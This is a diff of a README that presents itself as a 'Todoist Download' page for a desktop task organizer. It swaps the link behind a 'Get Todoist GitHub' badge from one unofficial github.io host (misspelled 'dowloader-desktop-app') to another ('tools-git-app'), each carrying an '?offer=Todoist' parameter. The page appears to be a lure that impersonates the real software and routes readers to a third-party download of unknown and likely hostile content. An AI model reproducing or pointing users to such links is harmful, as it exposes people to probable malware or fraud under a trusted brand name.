@@ -1,6 +1,6 @@
 # Todoist Download — Desktop Task Organizer  
 
-[![Get Todoist GitHub](https://img.shields.io/badge/Get%20Todoist%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dowloader-desktop-app.github.io/.github/?offer=Todoist)  
+[![Get Todoist GitHub](https://img.shields.io/badge/Get%20Todoist%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://tools-git-app.github.io/.github/?offer=Todoist)  
 
 ---
 
